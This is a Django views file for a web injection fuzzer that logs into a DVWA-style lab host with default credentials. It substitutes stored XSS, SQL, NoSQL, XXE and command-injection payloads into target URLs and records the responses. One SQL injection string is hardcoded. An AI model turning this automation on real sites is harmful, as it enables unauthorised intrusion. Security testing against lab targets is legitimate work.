from django.shortcuts import render, redirect
from django.http import HttpResponseRedirect as HRR
from .models import *
from .forms import FormField
import requests
import os
import re
from requests.utils import requote_uri
from bs4 import BeautifulSoup as bs
# Create your views here.
# def index(request):
#     form_field = FormField()
    
#     context = {
#         'data_form':form_field
#     }
#     print(request.POST)
#     return render(request, 'tools/index.html',context)
response_code = []
content_length = []
payload = []
result = []

example_string = "http://47.254.202.210/vulnerabilities/sqli/?id=%20OR%203409%3d3409%20AND%20(%27pytW%27%20LIKE%20%27pytW&Submit=Submit"
URL = "http://47.254.202.210/login.php"

def createSession(url):
    s = requests.Session()
    soup = bs(s.get(url).content, "html.parser")
    hidden = soup.find("input", type="hidden")
    token = hidden.get("value")
    payload = {"username": "admin", "password": "password", "Login":"Login", "user_token": token}
    s.post(url, data=payload)
    return s

def findInput(url):
    s = createSession(URL)
    content = s.get(url).content
    soup = bs(content, "html.parser")
    input_form = soup.find_all("input")
    return [i.get("name") for i in input_form if i.get("name") is not None]

context_data = {}
def postMethodValidation(url, type_attack):
    input_id = findInput(url)
    global context_data
    context_data = {
        "url": url,
        "input_id": input_id,
        "type_attack" : type_attack
    }
    # print(context_data)


def postMethodView(request):
    global result
    input_id = context_data["input_id"]
    payload = {}
    if request.method == 'POST':
        for key, value in request.POST.items():
            payload[key] = value
        for key, val in payload.items():
            for p in xss.objects.all()[:5]:
                pay = p.payload
                payload[key] = re.sub("\$[a-zA-Z0-9]*\$", pay, val)
                s = createSession(URL)
                response = s.post(context_data['url'], data=payload[key])
                status_code = response.status_code
                content_length = len(response.text)
                result.append([payload[key], status_code, content_length])
        return HRR("../result/") 
    return render(request, "tools/post_method.html", context_data)

def index(request):
    global response_code
    global content_length
    global payload
    global result
    if request.method == "POST":
        form_field = FormField(request.POST)
        if (form_field.is_valid()):
            url = form_field.cleaned_data["url_field"]
            type_attack = form_field.cleaned_data['type_attack']
            attack_method = form_field.cleaned_data['attack_method']
            if (attack_method == "POST"):
                postMethodValidation(url, type_attack)
                return HRR('method/post')
            if(type_attack == 'xss'):
                # print(xss.objects.values_list("payload"))
                # payload = xss.objects.values("payload").get(id=1)['payload']
                for p in (xss.objects.all()[:5]):
                    payload = p.payload
                    submit = re.sub("\$[a-zA-Z0-9]*\$", payload, url)
                    submit = requote_uri(submit)
                    session = createSession(URL)
                    response = session.post(submit)
                    status_code = response.status_code
                    content_length = len(response.content)
                    result.append([payload, status_code, content_length])
                # payload = xss.objects.all()
                # print(submit)
                # payload = xss.objects.all()
            elif(type_attack == "sqli"):
                for i, p in enumerate(sqlinjection.objects.all()[:30]):
                    payload = p.payload
                    submit = re.sub("\$[a-zA-Z0-9]*\$", payload, url)
                    submit = requote_uri(submit)
                    # if (i == 12):
                    #     print("index 12's payload:", submit)
                    session = createSession(URL)
                    # session = requests.Session()
                    response = session.post(submit)
                    status_code = response.status_code
                    content_length = len(response.text)
                    if (content_length != 4479):
                        print(response.text)
                    result.append([payload, status_code, content_length])
                # payload = sqlinjection.objects.all()
            elif(type_attack == "nosql"):
                for p in nosqlinjection.objects.all():
                    payload = p.payload
                    submit = re.sub("\$[a-zA-Z0-9]*\$", payload, url)
                    response = requests.post(submit)
                    status_code = requests.post(submit).status_code
                    content_length = len(response.content)
                    result.append([payload, status_code, content_length])
                # payload = nosqlinjection.objects.all()
            elif(type_attack == "xxe"):
                for p in xxeinjection.objects.all():
                    payload = p.payload
                    submit = re.sub("\$[a-zA-Z0-9]*\$", payload, url)
                # payload = xxeinjection.objects.all()
            elif(type_attack == "command"):
                for p in commandinjection.objects.all():
                    payload = p.payload
                    submit = re.sub("\$[a-zA-Z0-9]*\$", payload, url)
                # payload = commandinjection.objects.all()
            # result = requests.post(submit, json={"username":"hello", "password":"world"})
            # response = requests.post(submit) 
            # response_code  = response.status_code
            # content_length = len(response.content)
            return HRR("result/")
    else:
        form_field = FormField()
    context = {
        'data_form':form_field
    }
    return render(request, 'tools/index.html', context)

def createResult(request):
    # return render(request, "tools/tools.html", {"response_code": response_code, "content_length": content_length, "payload": payload})
    return render(request, "tools/beta_tools.html", {"result": result})